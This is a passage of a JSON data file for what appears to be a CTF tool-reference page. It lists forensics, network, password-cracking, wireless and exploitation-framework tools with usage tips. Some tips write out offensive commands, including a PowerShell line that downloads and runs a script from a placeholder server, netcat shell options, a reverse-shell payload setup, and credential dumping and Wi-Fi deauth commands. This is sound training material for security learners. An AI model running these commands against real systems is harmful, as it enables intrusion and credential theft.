XOR to reveal differences. Extract > Data to dump raw bit-plane bytes.", "link": "https://github.com/Giotino/stegsolve"}, {"name": "zsteg", "platform": "Linux", "priority": "Must Master", "desc": "PNG and BMP LSB steganography detector", "why": "Autodetects LSB-encoded secrets in PNG and BMP images", "tips": "zsteg image.png tries all common LSB configurations automatically. zsteg -a for all tests. zsteg -e b1,rgb,lsb,xy image.png for a specific channel. Run this before manually checking bit planes.", "link": "https://github.com/zed-0xff/zsteg"}, {"name": "file and xxd", "platform": "Linux", "priority": "Must Master", "desc": "File type identification and hex dump utilities", "why": "First steps in any forensics challenge to understand file structure", "tips": "file mystery.bin identifies the true file type from magic bytes regardless of extension. xxd mystery.bin | head -20 shows the hex header. Compare magic bytes to known file signatures (PNG: 89 50 4E 47). Fix corrupt headers manually.", "link": "https://linux.die.net/man/1/file"}, {"name": "foremost", "platform": "Linux", "priority": "Important", "desc": "File carver that recovers files by magic bytes", "why": "Recovers deleted and embedded files from raw disk images", "tips": "foremost -i disk.img -o output/ carves all recognized file types. Edit /etc/foremost.conf to add custom file signatures. Useful when Autopsy misses carved files or when working with raw binary blobs.", "link": "https://github.com/korczis/foremost"}, {"name": "steghide", "platform": "Linux / Win", "priority": "Important", "desc": "Hide and extract data in image and audio files", "why": "Extracts password-protected hidden data from JPEG and WAV files", "tips": "steghide extract -sf image.jpg and enter the password when prompted. Try a blank password first; many CTFs use no password. Combine with stegseek to bruteforce the password automatically.", "link": "https://steghide.sourceforge.net"}, {"name": "stegseek", "platform": "Linux", "priority": "Important", "desc": "Ultra-fast steghide password bruteforcer", "why": "Cracks steghide passwords orders of magnitude faster than manual attempts", "tips": "stegseek image.jpg rockyou.txt automatically tries all passwords. Can crack a typical CTF steghide challenge in under a second with rockyou. Always try this before spending time manually guessing passwords.", "link": "https://github.com/RickdeJager/stegseek"}, {"name": "Audacity", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Audio editor with spectrogram visualization", "why": "View spectrograms to find flags hidden in audio files", "tips": "Change the track view to Spectrogram by clicking the track name dropdown. Hidden messages often appear as text or patterns visible in the spectrogram. Also check Analyze > Plot Spectrum for frequency-domain anomalies.", "link": "https://www.audacityteam.org"}, {"name": "pngcheck", "platform": "Linux", "priority": "Important", "desc": "PNG file integrity and chunk inspector", "why": "Reveals corrupt or hidden chunks in PNG files", "tips": "pngcheck -v image.png shows all chunks with details. Suspicious extra chunks after IEND are a common CTF stego trick. Check for tEXt or zTXt chunks that may contain hidden data.", "link": "http://www.libpng.org/pub/png/apps/pngcheck.html"}, {"name": "oletools", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Office macro and OLE stream analyzer", "why": "Extracts and analyzes macros from malicious Office files", "tips": "olevba document.doc extracts and displays VBA macros. oleid checks for suspicious indicators. mraptor detects auto-executing macros. Essential for any challenge involving Word/Excel/PowerPoint files with embedded scripts.", "link": "https://github.com/decalage2/oletools"}, {"name": "PhotoRec / TestDisk", "platform": "Linux/Windows/Mac", "priority": "Important", "desc": "File carving and data recovery tool that scans raw disk images for recognizable file signatures and recovers them, ignoring the filesystem structure.", "why": "Recovers deleted or fragmented files from disk images when the filesystem metadata is damaged or absent.", "tips": "Run on a copy of the image, not the original; it recovers by signature so works even on corrupted filesystems.", "link": "https://www.cgsecurity.org/wiki/PhotoRec"}, {"name": "bulk_extractor", "platform": "Linux", "priority": "Useful", "desc": "Scans disk images, files, or memory dumps for emails, URLs, credit card numbers, and other artifacts without parsing the filesystem.", "why": "Fast first-pass scan for forensic artifacts across an entire image when you don't know where to look.", "tips": "Check the output 'url_histogram.txt' and 'email_histogram.txt' for quick wins.", "link": "https://github.com/simsong/bulk_extractor"}, {"name": "Registry Explorer / RegRipper", "platform": "Windows/Linux", "priority": "Useful", "desc": "Parses Windows Registry hive files to extract user activity, installed software, USB history, and recently accessed files.", "why": "Windows-based forensics challenges often hide answers in registry artifacts like NTUSER.DAT.", "tips": "RegRipper plugins automate extraction of common artifact categories from each hive.", "link": "https://github.com/keydet89/RegRipper3.0"}, {"name": "CAPA", "platform": "Linux/Win/Mac", "desc": "Tool from FireEye that identifies capabilities in malware and programs using a rule-based matching system.", "why": "Quickly understand what a binary can do (network, file ops, crypto) without full reverse engineering.", "tips": "capa binary.exe to get capability summary. Use --rules /path to custom rules. -j for JSON output for scripting.", "link": "https://github.com/mandiant/capa"}, {"name": "Sysinternals Suite", "platform": "Windows", "desc": "Microsoft's collection of advanced Windows system utilities for process analysis, network monitoring, and file inspection.", "why": "Essential for Windows forensics CTF challenges; Process Monitor and Autoruns reveal malicious behavior.", "tips": "ProcMon captures all file/registry/network activity in real-time. Autoruns shows everything that runs at startup.", "link": "https://learn.microsoft.com/en-us/sysinternals/"}, {"name": "Wireshark (stego)", "platform": "Linux/Win/Mac", "desc": "Wireshark's packet dissectors can decode covert channel data hidden inside legitimate protocols like ICMP and DNS.", "why": "Flags are often hidden inside ICMP payloads, DNS query labels, or HTTP headers in network stego challenges.", "tips": "Filter icmp and check Data tab for hidden payloads. dns.qry.name for DNS exfil. Export raw bytes with Follow Stream.", "link": "https://www.wireshark.org"}, {"name": "Autopsy (Timeline)", "platform": "Linux/Win", "desc": "Autopsy's timeline analysis feature reconstructs system activity chronologically from disk images.", "why": "CTF disk forensics often require finding exactly what happened and when; timeline analysis pinpoints key events.", "tips": "Add a Data Source then generate timeline under Timeline menu. Filter by file activity, web history, or user actions.", "link": "https://www.autopsy.com"}, {"name": "Velociraptor", "platform": "Linux/Win/Mac", "desc": "Endpoint visibility and collection tool for digital forensics and incident response at scale.", "why": "Powerful artifact collection framework; used in advanced forensics CTF categories and blue team challenges.", "tips": "velociraptor query 'SELECT * FROM Artifact.Windows.KapeFiles.Targets()' to collect artifacts via VQL.", "link": "https://github.com/Velocidex/velociraptor"}, {"name": "FTK Imager", "platform": "Windows", "desc": "Free forensic disk imaging tool that creates exact bit-by-bit copies and mounts disk images for analysis.", "why": "Standard tool for creating and working with forensic disk images in CTF challenges.", "tips": "File > Image Mounting to mount without writing. Add Evidence Item to analyze without imaging first. Export files by right-clicking.", "link": "https://www.exterro.com/ftk-imager"}, {"name": "CyberSole / FRED", "platform": "Linux/Win", "desc": "Forensic Registry Editor (FRED) for offline analysis of Windows Registry hive files without mounting.", "why": "Registry hives in disk images contain user activity, persistence mechanisms, and program execution evidence.", "tips": "Open NTUSER.DAT, SOFTWARE, SYSTEM hives directly. Navigate to common forensic keys like RecentDocs, UserAssist, Run.", "link": "https://www.pinguin.lu/fred"}], "toolgrid-network": [{"name": "Wireshark", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Deep packet inspection and protocol decoder", "why": "Decode, filter, and follow streams in network PCAP challenges", "tips": "Key filters: http, dns, tcp.stream eq N, ip.addr == x.x.x.x. Follow TCP/UDP/HTTP streams by right-clicking a packet. Export objects from File > Export Objects. Statistics > Conversations shows top talkers quickly.", "link": "https://www.wireshark.org"}, {"name": "Scapy", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Python library for packet crafting and dissection", "why": "Craft and parse packets and automate network protocol challenges", "tips": "rdpcap('file.pcap') to read captures. Packet[TCP].payload to access layers. Use send() and sniff() for live traffic. Great for crafting custom protocol packets when standard tools do not support the protocol.", "link": "https://scapy.net"}, {"name": "Netcat", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "TCP and UDP Swiss army knife", "why": "Connect to CTF services, transfer files, and catch reverse shells", "tips": "nc host port for basic connection. nc -lvnp 4444 to listen for incoming shells. Use -e /bin/bash for bind shells on older versions. Combine with pwntools remote() for scripted interaction.", "link": "https://nmap.org/ncat"}, {"name": "tshark", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Command-line version of Wireshark", "why": "Scriptable PCAP analysis and field extraction for automation", "tips": "tshark -r file.pcap -Y 'http' -T fields -e http.request.uri extracts all HTTP URIs. Pipe output to grep, sort, uniq for quick analysis. Use -z follow,tcp,ascii,0 to follow a TCP stream from the command line.", "link": "https://www.wireshark.org/docs/man-pages/tshark.html"}, {"name": "socat", "platform": "Linux", "priority": "Important", "desc": "Advanced netcat replacement with SSL and forwarding support", "why": "SSL wrapping, port forwarding, and broader protocol support", "tips": "socat - OPENSSL:host:443 for SSL connections. socat TCP-LISTEN:8080,fork TCP:remote:80 for port forwarding. Use EXEC to attach a program to a socket. More powerful than nc for complex networking challenges.", "link": "http://www.dest-unreach.org/socat"}, {"name": "tcpdump", "platform": "Linux", "priority": "Important", "desc": "Command-line packet capture tool", "why": "Quick packet captures and filters without needing a GUI", "tips": "tcpdump -i eth0 -w output.pcap to capture. tcpdump -r file.pcap port 80 to filter. Use -A to print packet payloads as ASCII. -nn disables name resolution for cleaner output. Pipe to strings for quick flag hunting.", "link": "https://www.tcpdump.org"}, {"name": "NetworkMiner", "platform": "Windows / Linux", "priority": "Important", "desc": "PCAP file artifact and credential extractor", "why": "Extracts transferred files, images, and credentials from PCAPs", "tips": "Open a PCAP and switch to the Files tab to see all transferred files automatically reconstructed. The Credentials tab shows cleartext passwords from HTTP, FTP, SMTP. Much faster than manually following streams in Wireshark.", "link": "https://www.netresec.com/?page=NetworkMiner"}, {"name": "nmap NSE scripts", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Nmap Scripting Engine for advanced enumeration", "why": "Enumerate services, detect vulnerabilities, and pull service banners", "tips": "nmap -sV --script=banner host grabs raw banners. --script=http-enum for web directories. --script=smb-enum-shares for Windows shares. Browse /usr/share/nmap/scripts/ to find scripts for specific services.", "link": "https://nmap.org/nsedoc"}, {"name": "ngrep", "platform": "Linux", "priority": "Important", "desc": "Network grep for searching packet payloads", "why": "Search for patterns directly in live or captured network traffic", "tips": "ngrep -q -W byline 'password' port 80 searches HTTP traffic for the word password. Use -I file.pcap to grep a capture file offline. Faster than Wireshark for simple keyword searches in large captures.", "link": "https://github.com/jpr5/ngrep"}, {"name": "Zeek", "platform": "Linux", "priority": "Useful", "desc": "Network traffic analyzer and intrusion detection system", "why": "High-level behavioral log analysis of network traffic", "tips": "Zeek generates structured logs (conn.log, http.log, dns.log) that are much easier to analyze at scale than raw PCAPs. Use zeek -r file.pcap to process a capture offline and analyze the resulting log files.", "link": "https://zeek.org"}, {"name": "Impacket Network Tools", "platform": "Linux/Python", "desc": "Impacket's network tools include SMB enumeration, Kerberos attacks, NTLM relay, and Windows protocol implementations.", "why": "Essential for Windows network CTF challenges; implements protocol-level attacks not available elsewhere.", "tips": "smbclient.py to browse shares. GetNPUsers.py for AS-REP roasting. ntlmrelayx.py for relay attacks.", "link": "https://github.com/fortra/impacket"}, {"name": "Responder", "platform": "Linux", "desc": "LLMNR, NBT-NS, and mDNS poisoner that captures NTLMv1/v2 hashes on local networks.", "why": "In Windows network CTF challenges, Responder captures credentials when machines try to resolve hostnames.", "tips": "responder -I eth0 -wrf to enable all poisoners. Captured hashes appear in logs/ directory for offline cracking.", "link": "https://github.com/lgandx/Responder"}, {"name": "Mitm6", "platform": "Linux/Python", "desc": "IPv6 DNS takeover attack tool that takes advantage of Windows preferring IPv6 over IPv4 for DNS.", "why": "Modern Windows networks often vulnerable to IPv6 attacks even when IPv6 isn't intentionally configured.", "tips": "mitm6 -d domain.local combined with ntlmrelayx.py for credential capture and relay attacks in AD CTFs.", "link": "https://github.com/dirkjanm/mitm6"}, {"name": "CrackMapExec / NetExec", "platform": "Linux", "desc": "Network enumeration and exploitation framework for Windows environments supporting SMB, WinRM, MSSQL, RDP.", "why": "Single tool for credential testing, hash spraying, and command execution across multiple Windows hosts.", "tips": "nxc smb 192.168.1.0/24 -u user -p pass --shares. nxc winrm target -u user -p pass -x 'whoami'.", "link": "https://github.com/Pennyw0rth/NetExec"}, {"name": "Dnscat2", "platform": "Linux", "desc": "DNS-based command and control; exfiltrates data and tunnels commands through DNS queries.", "why": "DNS exfiltration is a common CTF technique; understanding it helps both offense and forensics challenges.", "tips": "Look for unusually long DNS subdomain labels in PCAP. Base32/hex encoded data in labels is the payload.", "link": "https://github.com/iagox86/dnscat2"}], "toolgrid-passwords": [{"name": "hashcat", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "GPU-accelerated hash cracking tool", "why": "Fastest hash cracker available; essential for password challenges", "tips": "Always use -m to specify hash mode (0=MD5, 1000=NTLM, 1800=sha512crypt). Start with rockyou.txt, then add rules: -r rules/best64.rule. Use --show after cracking to display results. Check the hashcat example hashes wiki for mode numbers.", "link": "https://hashcat.net/hashcat"}, {"name": "John the Ripper", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "CPU-based versatile hash and password cracker", "why": "Crack shadow files, ZIP archives, Office files, and SSH keys", "tips": "Use ssh2john, zip2john, office2john to convert files to crackable format first. john --wordlist=rockyou.txt hash.txt. --rules=Jumbo adds powerful mangling rules. john --show hash.txt after cracking to see results.", "link": "https://www.openwall.com/john"}, {"name": "rockyou.txt and SecLists", "platform": "Linux", "priority": "Must Master", "desc": "Standard CTF wordlist collections", "why": "Go-to wordlists for almost every password cracking challenge", "tips": "rockyou.txt is the default first choice. SecLists has specialized lists: passwords/Common-Credentials/, Discovery/Web-Content/ for directories. Match the wordlist to the context: default creds list for login panels, rockyou for hashes.", "link": "https://github.com/danielmiessler/SecLists"}, {"name": "hash-identifier", "platform": "Linux", "priority": "Must Master", "desc": "Hash type identification tool", "why": "Identify the correct hash algorithm before attempting to crack", "tips": "Run hash-identifier and paste the hash. Also try haiti or name-that-hash for more confident identification. Knowing the hash type is required to set the correct -m mode in hashcat. Never guess the hash type.", "link": "https://github.com/blackploit/hash-identifier"}, {"name": "Hydra", "platform": "Linux", "priority": "Important", "desc": "Online service login bruteforcer", "why": "Bruteforce SSH, FTP, HTTP, and other service login forms", "tips": "hydra -l admin -P rockyou.txt ssh://target for SSH. hydra -l user -P list.txt target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'. Use -t 4 for SSH to avoid lockouts. Always use small targeted wordlists online.", "link": "https://github.com/vanhauser-thc/thc-hydra"}, {"name": "Medusa", "platform": "Linux", "priority": "Important", "desc": "Parallel network login auditor", "why": "Faster than Hydra for some protocols with better parallelism", "tips": "medusa -h target -u admin -P rockyou.txt -M ssh. Use -t for thread count. Better than Hydra for FTP and some database protocols. Check module support with medusa -d to see available service modules.", "link": "https://github.com/jmk-foofus/medusa"}, {"name": "CeWL", "platform": "Linux", "priority": "Important", "desc": "Custom wordlist generator from target websites", "why": "Generates targeted wordlists from words on the CTF challenge page", "tips": "cewl http://target.com -w wordlist.txt. Add -d 3 to crawl deeper. Use -m 6 to set minimum word length. The challenge page often contains thematic words used as passwords. Combine with John mangling rules.", "link": "https://github.com/digininja/CeWL"}, {"name": "Crunch", "platform": "Linux", "priority": "Important", "desc": "Pattern-based wordlist generator", "why": "Generates wordlists by character set and pattern constraints", "tips": "crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt for all 8-char alphanumeric combos. Use -t pattern where @ is lowercase, , is uppercase, % is digit, ^ is symbol. Size warning: large charsets create huge files.", "link": "https://sourceforge.net/projects/crunch-wordlist"}, {"name": "name-that-hash", "platform": "Linux", "priority": "Important", "desc": "Modern hash identifier with confidence scores", "why": "Better hash detection than hash-identifier with probability scores", "tips": "nth --text 'hashvalue' gives ranked guesses with probability. More accurate than hash-identifier for modern hash types. Outputs suggested hashcat -m mode numbers directly, saving a lookup step.", "link": "https://github.com/HashPals/Name-That-Hash"}, {"name": "Mentalist", "platform": "Linux / Win / Mac", "priority": "Useful", "desc": "GUI wordlist rule builder for hashcat", "why": "Visually construct complex password mangling rules", "tips": "Drag-and-drop interface to build rules like append year, capitalize, substitute letters. Export rules directly to hashcat format. Good when you have a hypothesis about the password pattern but need to enumerate variations.", "link": "https://github.com/sc0tfree/mentalist"}, {"name": "CrackStation / online hash lookups", "platform": "Web", "priority": "Important", "desc": "Massive precomputed lookup tables for common hash types (MD5, SHA1, NTLM) using huge wordlists.", "why": "Instant results for hashes of common passwords without running local cracking tools.", "tips": "Always try this first for unsalted MD5/SHA1 before spinning up hashcat.", "link": "https://crackstation.net/"}, {"name": "Spray", "platform": "Linux", "desc": "Password spraying tool against multiple protocols to avoid account lockouts by testing one password at a time.", "why": "In AD challenges, spraying common passwords (Password1!, Summer2024!) against all users avoids lockouts.", "tips": "spray -u users.txt -p 'Password1!' -t 0 -smb target. Use low thread count and delays to avoid lockout.", "link": "https://github.com/SpiderLabs/Spray"}, {"name": "Kerbrute", "platform": "Linux", "desc": "Kerberos brute-force and enumeration tool that validates usernames and brute-forces accounts without lockout.", "why": "Kerberos authentication gives different error codes for valid/invalid users vs wrong passwords, enabling enumeration.", "tips": "kerbrute userenum -d domain.local users.txt --dc dc.domain.local. kerbrute bruteuser to brute a specific user.", "link": "https://github.com/ropnop/kerbrute"}, {"name": "Pipal", "platform": "Linux/Ruby", "desc": "Password analyzer that generates statistics from wordlists: most common patterns, lengths, character sets used.", "why": "When you have a dump of passwords, Pipal reveals patterns that help crack the remaining ones.", "tips": "pipal wordlist.txt to get statistics. Use output to build targeted Hashcat masks like ?u?l?l?l?d?d for common patterns.", "link": "https://github.com/digininja/pipal"}, {"name": "DefaultCreds Cheat Sheet", "platform": "Web", "desc": "Comprehensive database of default credentials for common devices, services, and applications.", "why": "Many CTF challenges use default credentials for the target application; this saves manual searching.", "tips": "Search by vendor, product, or service type. Try all listed credentials before attempting brute-force.", "link": "https://github.com/ihebski/DefaultCreds-cheat-sheet"}, {"name": "Hob0Rules", "platform": "Linux", "desc": "Advanced Hashcat rule set based on real password leak analysis; more effective than best64.rule for modern passwords.", "why": "Real passwords follow predictable patterns; these rules based on leaked databases crack more hashes faster.", "tips": "hashcat -m 0 hashes.txt rockyou.txt -r hob064.rule. Run after best64 fails. Covers corporate password patterns well.", "link": "https://github.com/praetorian-inc/Hob0Rules"}], "toolgrid-wireless": [{"name": "Aircrack-ng", "platform": "Linux", "priority": "Important", "desc": "Wi-Fi auditing suite for capturing and cracking WEP and WPA", "why": "Captures handshakes and cracks WPA2 passwords", "tips": "Workflow: airmon-ng start wlan0, airodump-ng wlan0mon to find targets, airodump-ng -c CH --bssid BSSID -w capture wlan0mon to capture handshake, aireplay-ng -0 1 -a BSSID wlan0mon to deauth a client and force handshake, then aircrack-ng -w rockyou.txt capture.cap.", "link": "https://www.aircrack-ng.org"}, {"name": "Wifite2", "platform": "Linux", "priority": "Important", "desc": "Automated wireless attack tool", "why": "Automates the full WPA handshake capture and crack workflow", "tips": "Just run wifite and select the target. It handles monitor mode, client deauth, handshake capture, and cracking automatically. Use --dict rockyou.txt for the wordlist. Faster for quick CTF wireless challenges than manual aircrack workflow.", "link": "https://github.com/derv82/wifite2"}, {"name": "hcxtools and hcxdumptool", "platform": "Linux", "priority": "Important", "desc": "PMKID and EAPOL Wi-Fi capture and conversion tools", "why": "Captures PMKID frames without needing a connected client", "tips": "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 captures PMKID. hcxpcapngtool capture.pcapng -o hash.hc22000 converts to hashcat format. Then hashcat -m 22000 hash.hc22000 rockyou.txt. No deauth needed.", "link": "https://github.com/ZerBea/hcxtools"}, {"name": "bettercap", "platform": "Linux", "priority": "Important", "desc": "Network attack and MITM framework", "why": "ARP spoofing, Wi-Fi probing, and MITM attacks in one tool", "tips": "Use the web UI (bettercap -caplet http-ui) for visual control. net.probe on discovers hosts. arp.spoof.targets sets MITM targets. https.proxy for SSL stripping. Good for challenges involving network interception.", "link": "https://www.bettercap.org"}, {"name": "Wireshark 802.11", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Wireless packet analyzer for 802.11 frames", "why": "Analyzes and decrypts captured 802.11 wireless frames", "tips": "Set the WPA decryption key in Edit > Preferences > Protocols > IEEE 802.11 > Decryption Keys. Once set, Wireshark decrypts WPA traffic automatically. Use wlan.fc.type_subtype == 8 to filter beacon frames.", "link": "https://www.wireshark.org"}, {"name": "Kismet", "platform": "Linux", "priority": "Useful", "desc": "Passive wireless network detector and analyzer", "why": "Finds hidden SSIDs and passively maps wireless environments", "tips": "Kismet does not transmit so it is harder to detect than active tools. Useful for CTF challenges requiring you to find hidden networks. Run kismet -c wlan0 and use the web interface at localhost:2501 to browse discovered networks.", "link": "https://www.kismetwireless.net"}, {"name": "GNU Radio", "platform": "Linux", "priority": "Useful", "desc": "Software-defined radio toolkit", "why": "For RF and SDR-based wireless CTF challenges", "tips": "Use GNU Radio Companion (GRC) to build signal processing flowgraphs visually. Start with a SDR Source block (RTL-SDR, HackRF) connected to a demodulator. Great for challenges involving NOAA satellites, ADS-B, or custom RF protocols.", "link": "https://www.gnuradio.org"}, {"name": "WiFite2", "platform": "Linux", "desc": "Automated wireless attack tool that handles monitor mode, deauth, handshake capture, and cracking in one workflow.", "why": "Automates the entire WPA2 attack workflow; just select the target and wait for results.", "tips": "wifite --kill to stop interfering processes first. Use --dict rockyou.txt for wordlist. --pmkid for PMKID attacks.", "link": "https://github.com/derv82/wifite2"}, {"name": "Airgeddon", "platform": "Linux", "desc": "Multi-use bash script for wireless auditing with menu-driven interface covering WPA, WPS, and evil twin attacks.", "why": "Beginner-friendly interface for wireless attacks; wraps Aircrack-ng, Hostapd, DHCP tools in one menu.", "tips": "Run as root and select your wireless card when prompted. Evil twin option creates a rogue AP for credential capture.", "link": "https://github.com/v1s1t0r1sh3r3/airgeddon"}, {"name": "Wifiphisher", "platform": "Linux", "desc": "Rogue access point framework for automated phishing attacks against Wi-Fi clients.", "why": "Social engineering wireless attack; useful for understanding how credential phishing works in CTF scenarios.", "tips": "wifiphisher -aI wlan0 -jI wlan1 --essid TargetAP. Clients get fake captive portal asking for WPA password.", "link": "https://github.com/wifiphisher/wifiphisher"}, {"name": "HCXDumptool", "platform": "Linux", "desc": "Capture PMKIDs and handshakes from Wi-Fi networks without requiring a connected client.", "why": "PMKID attack requires no clients, making it faster and stealthier than traditional handshake capture.", "tips": "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1. Convert with hcxpcapngtool for hashcat -m 22000.", "link": "https://github.com/ZerBea/hcxtools"}], "toolgrid-frameworks": [{"name": "Metasploit Framework", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Comprehensive exploitation and post-exploitation framework", "why": "Thousands of exploit modules with pivoting and payload generation", "tips": "Use msfconsole to enter the framework. search cve:2021 to find relevant exploits. use exploit/path, set RHOSTS target, set PAYLOAD linux/x64/shell_reverse_tcp, set LHOST yourip, then run. Use msfvenom for standalone payload generation.", "link": "https://www.metasploit.com"}, {"name": "impacket", "platform": "Linux", "priority": "Important", "desc": "Python library for Windows and Active Directory protocols", "why": "SMB, Kerberoasting, and Pass-the-Hash in Windows AD CTFs", "tips": "secretsdump.py dumps hashes remotely. GetUserSPNs.py performs Kerberoasting. psexec.py gives remote shells. smbclient.py for SMB file browsing. Essential toolkit for any HackTheBox Windows or Active Directory challenge.", "link": "https://github.com/fortra/impacket"}, {"name": "BloodHound", "platform": "Linux / Win", "priority": "Important", "desc": "Active Directory attack path visualizer", "why": "Maps privilege escalation paths in Active Directory environments", "tips": "Run SharpHound collector on a domain-joined machine to gather data. Import the JSON files into BloodHound. Use the pre-built queries: Find Shortest Paths to Domain Admins. Click on objects to see attack paths and exploit techniques.", "link": "https://github.com/BloodHoundAD/BloodHound"}, {"name": "NetExec (CrackMapExec)", "platform": "Linux", "priority": "Important", "desc": "Swiss army knife for Windows network enumeration and exploitation", "why": "Lateral movement and enumeration across Windows CTF domains", "tips": "nxc smb target -u user -p pass --shares to list shares. --sam to dump SAM hashes. -x cmd to execute commands. Use -M to load modules like lsassy for in-memory credential dumping. Replaces the older CrackMapExec.", "link": "https://github.com/Pennyw0rth/NetExec"}, {"name": "evil-winrm", "platform": "Linux", "priority": "Important", "desc": "PowerShell remote shell for Windows machines", "why": "Best interactive shell for WinRM-enabled CTF Windows boxes", "tips": "evil-winrm -i target -u user -p password. Use -s to specify a local directory for PowerShell scripts that auto-upload on demand. Upload and Download commands for file transfer. Much more comfortable than raw netcat shells.", "link": "https://github.com/Hackplayers/evil-winrm"}, {"name": "Empire", "platform": "Linux", "priority": "Important", "desc": "Post-exploitation command and control framework", "why": "Advanced post-exploitation and persistence in complex CTF scenarios", "tips": "Good for multi-stage attacks in AD CTFs. Generates stageless and staged PowerShell stagers. Use HTTP and HTTPS listeners with domain fronting for evasion. Best for challenges that require persistence or complex lateral movement.", "link": "https://github.com/BC-SECURITY/Empire"}, {"name": "BeEF", "platform": "Linux", "priority": "Useful", "desc": "Browser exploitation framework for XSS-based attacks", "why": "Hooks browsers via XSS and enables client-side attack chains", "tips": "Host a hook.js script via BeEF server and inject it through an XSS vulnerability. Once a browser is hooked you can run social engineering attacks, steal cookies, and probe the internal network from the victim browser.", "link": "https://beefproject.com"}, {"name": "Havoc", "platform": "Linux", "priority": "Useful", "desc": "Modern C2 framework as a Cobalt Strike alternative", "why": "Advanced post-exploitation for sophisticated CTF red team scenarios", "tips": "Use for CTF scenarios that simulate full red team engagements. The Demon agent supports process injection, token impersonation, and SOCKS proxying. Primarily useful for very advanced CTF categories like red team or APT simulation.", "link": "https://github.com/HavocFramework/Havoc"}, {"name": "CrackMapExec / NetExec", "platform": "Linux/Python", "priority": "Important", "desc": "Swiss-army-knife for Active Directory enumeration and exploitation, tests credentials across many hosts, dumps hashes, executes commands.", "why": "Standard first tool for AD-based CTF environments (HackTheBox Pro Labs, etc.) once you have any valid credentials.", "tips": "Use --shares to enumerate accessible SMB shares across the whole domain quickly.", "link": "https://github.com/Pennyw0rth/NetExec"}, {"name": "Covenant", "platform": "Linux/Windows", "desc": "Collaborative .NET C2 framework with a web-based interface for red team operations and CTF post-exploitation.", "why": "Modern C2 with Grunt implants; useful for Windows-based CTF challenges requiring stealth and persistence.", "tips": "Create a listener, generate a Grunt launcher, execute on target. Tasks are queued and results appear in web UI.", "link": "https://github.com/cobbr/Covenant"}, {"name": "Sliver", "platform": "Linux/Win/Mac", "desc": "Open-source adversary emulation framework with implants supporting multiple C2 channels (mTLS, WireGuard, HTTP).", "why": "Modern Cobalt Strike alternative; used in advanced CTF scenarios and red team competitions.", "tips": "generate --http https://your-server for HTTP implant. armory install all for additional tools. profiles for reuse.", "link": "https://github.com/BishopFox/sliver"}, {"name": "PowerSploit", "platform": "Windows/PowerShell", "desc": "Collection of PowerShell modules for post-exploitation including privilege escalation, reconnaissance, and persistence.", "why": "Essential PowerShell toolkit for Windows CTF post-exploitation; many privesc scripts work straight from memory.", "tips": "IEX (New-Object Net.WebClient).DownloadString('http://your-server/PowerUp.ps1'); Invoke-AllChecks for privesc scan.", "link": "https://github.com/PowerShellMafia/PowerSploit"}, {"name": "Chisel", "platform": "Linux/Win/Mac", "desc": "Fast TCP/UDP tunneling tool that works over HTTP using SSH-like protocol for pivoting through restricted networks.", "why": "Essential for CTF pivoting; tunnels traffic through web-accessible machines to reach internal network segments.", "tips": "Server: chisel server -p 8080 --reverse. Client: chisel client server:8080 R:local_port:internal_host:port.", "link": "https://github.com/jpillora/chisel"}, {"name": "Ligolo-ng", "platform": "Linux/Win", "desc": "Advanced tunneling and pivoting tool using TUN interfaces for seamless access to internal network segments.", "why": "More elegant than Chisel; creates a virtual network interface so tools work natively without proxychains.", "tips": "Run server on attacker, agent on target. Add route ip route add 192.168.1.0/24 dev ligolo. Then access directly.", "link": "https://github.com/nicocha30/ligolo-ng"}, {"name": "CrackMapExec Modules", "platform": "Linux", "desc": "CrackMapExec/NetExec modules including lsassy, nanodump, spider_plus for advanced post-exploitation.", "why": "Extends NetExec with in-memory credential dumping, file spidering, and advanced AD enumeration.", "tips": "nxc smb target -M lsassy -u user -p pass for memory credential dump. -M spider_plus for file discovery.", "link": "https://github.com/Pennyw0rth/NetExec"}], "toolgrid-utilities": [{"name": "CyberChef", "platform": "Web / Local", "priority": "Must Master", "desc": "Universal data manipulation and analysis tool", "why": "Encoding, decoding, hashing, and crypto transforms all in one place", "tips": "Use the Magic operation to auto-detect encodings when you do not know what format data is in. Download and run locally so you can use it offline during CTFs with restricted internet. Share recipe links with teammates.", "link": "https://gchq.github.io/CyberChef"}, {"name": "Python 3", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "General purpose scripting and solver language", "why": "Write custom solvers for any challenge category quickly", "tips": "Learn the standard library well: struct for binary packing, socket for networking, re for regex, base64, hashlib. Combine with pwntools, z3, and pycryptodome. A one-file Python script solves the majority of CTF challenges.", "link": "https://www.python.org"}, {"name": "pwntools", "platform": "Linux", "priority": "Must Master", "desc": "CTF exploit scripting and automation framework", "why": "Automate interactions with pwn and network services", "tips": "from pwn import * imports everything. Use tubes: process(), remote(), ssh(). recvuntil(b'> ') waits for a prompt. sendline(b'data') sends input. context.log_level = 'debug' shows all traffic for debugging.", "link": "https://github.com/Gallopsled/pwntools"}, {"name": "z3", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "SMT solver for constraint-based problem solving", "why": "Solve equations and logic puzzles in RE, crypto, and misc challenges", "tips": "Model the problem as constraints on z3 variables. If the challenge checks your input with a series of conditions, model each condition as a z3 constraint and let the solver find satisfying input automatically.", "link": "https://github.com/Z3Prover/z3"}, {"name": "angr", "platform": "Linux", "priority": "Important", "desc": "Binary analysis and symbolic execution framework", "why": "Automatically solve binary challenges through path exploration", "tips": "proj = angr.Project('./binary'). simgr = proj.factory.simgr(). simgr.explore(find=WIN_ADDR, avoid=FAIL_ADDR). simgr.found[0].posix.dumps(0) extracts the winning input. Best for crackmes with complex multi-condition checks.", "link": "https://angr.io"}, {"name": "Frida", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Dynamic instrumentation for runtime function hooking", "why": "Hook and inspect function arguments and return values at runtime", "tips": "Use frida -U -f com.app.id -l script.js for Android apps. Interceptor.attach(Module.findExportByName(null, 